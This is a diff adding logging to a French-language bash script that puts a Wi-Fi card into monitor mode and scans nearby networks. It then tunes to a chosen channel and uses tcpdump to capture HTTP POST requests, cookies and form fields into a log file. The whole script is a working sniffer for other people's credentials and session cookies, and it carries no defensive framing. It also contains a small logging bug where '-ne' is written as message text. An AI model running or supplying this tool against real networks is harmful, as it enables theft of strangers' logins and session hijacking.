@@ -1,9 +1,30 @@
 #!/bin/bash
 
+# Configuration du logging
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+LOG_DIR="$SCRIPT_DIR/logs"
+LOG_FILE="$LOG_DIR/wifi_sniffer_all.log"
+
+# Création du dossier logs s'il n'existe pas
+mkdir -p "$LOG_DIR"
+
+# Fonction de logging
+log() {
+    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+    local message="[$timestamp] $1"
+    echo "$message" | tee -a "$LOG_FILE"
+}
+
+# Nettoyage du fichier de log au démarrage
+echo "" > "$LOG_FILE"
+
+# Redirection de stderr vers le fichier de log
+exec 2>> "$LOG_FILE"
+
 # Vérifie si aircrack-ng et tcpdump sont installés
 for cmd in airmon-ng tcpdump; do
     if ! command -v $cmd &> /dev/null; then
-        echo "[❌] $cmd n'est pas installé ! Installe-le avec : sudo apt install $cmd"
+        log "[❌] $cmd n'est pas installé ! Installe-le avec : sudo apt install $cmd"
         exit 1
     fi
 done
@@ -12,15 +33,15 @@ done
 INTERFACE=$(sudo airmon-ng | awk 'NR>2 && $2!="" {print $2; exit}')
 
 if [[ -z "$INTERFACE" ]]; then
-    echo "[❌] Aucune carte Wi-Fi détectée ! Vérifie ta connexion."
+    log "[❌] Aucune carte Wi-Fi détectée ! Vérifie ta connexion."
     exit 1
 fi
 
-echo "[✅] Carte détectée : $INTERFACE"
+log "[✅] Carte détectée : $INTERFACE"
 
 # Vérifie si l'interface est déjà en mode monitor
 if iw dev "$INTERFACE" info | grep -q "type monitor"; then
-    echo "[✅] L'interface $INTERFACE est déjà en mode monitor."
+    log "[✅] L'interface $INTERFACE est déjà en mode monitor."
     MONITOR_INTERFACE="$INTERFACE"
 else
     # Active le mode monitor
@@ -29,39 +50,39 @@ else
     
     # Vérifie si l'activation a fonctionné
     if ! iw dev "$MONITOR_INTERFACE" info | grep -q "type monitor"; then
-        echo "[❌] Impossible d'activer le mode monitor sur $INTERFACE."
+        log "[❌] Impossible d'activer le mode monitor sur $INTERFACE."
         exit 1
     fi
     
-    echo "[✅] Mode monitor activé sur : $MONITOR_INTERFACE"
+    log "[✅] Mode monitor activé sur : $MONITOR_INTERFACE"
 fi
 
 # Supprime les anciens fichiers de scan
 rm -f networks-01.csv
 
 # Scan des réseaux Wi-Fi avec `airodump-ng`
-echo "[🔍] Scan des réseaux Wi-Fi en cours..."
+log "[🔍] Scan des réseaux Wi-Fi en cours..."
 sudo airodump-ng --output-format csv -w networks "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &
 
 # Effet de chargement (7 secondes)
-echo -ne "[🔄] Attente du scan"
+log -ne "[🔄] Attente du scan"
 for i in {1..7}; do
-    echo -ne "."
+    log -ne "."
     sleep 1
 done
-echo ""
+log ""
 
 # Arrêter le scan
 sudo pkill airodump-ng
 
 # Vérifie si le fichier de scan a été généré
 if [ ! -f networks-01.csv ]; then
-    echo "[❌] Aucun réseau détecté. Vérifie que la carte est bien en mode monitor."
+    log "[❌] Aucun réseau détecté. Vérifie que la carte est bien en mode monitor."
     exit 1
 fi
 
 # Afficher les canaux, SSID et type de chiffrement
-echo "📡 Réseaux détectés :"
+log "📡 Réseaux détectés :"
 awk -F',' '
 NR>2 {
     ssid=$14
@@ -85,14 +106,14 @@ NR>2 {
 }' networks-01.csv | column -t
 
 # Demande à l'utilisateur de choisir un canal
-echo ""
+log ""
 read -p "📡 Entre le numéro du canal à surveiller : " CANAL
 
 # Bascule la carte Wi-Fi sur le canal choisi
 sudo iw dev "$MONITOR_INTERFACE" set channel "$CANAL"
-echo "[✅] Surveillance du canal $CANAL..."
+log "[✅] Surveillance du canal $CANAL..."
 
 # Lancer la capture avec tcpdump pour capturer toutes les requêtes POST
-echo "[📡] Capture en cours... (Appuie sur CTRL+C pour arrêter)"
+log "[📡] Capture en cours... (Appuie sur CTRL+C pour arrêter)"
 sudo tcpdump -i "$MONITOR_INTERFACE" -A -s 0 port 80 | grep -E "POST|Host:|User-Agent:|Content-Length:|Content-Type:|Referer:|Cookie:|=|&" | tee capture.log
 
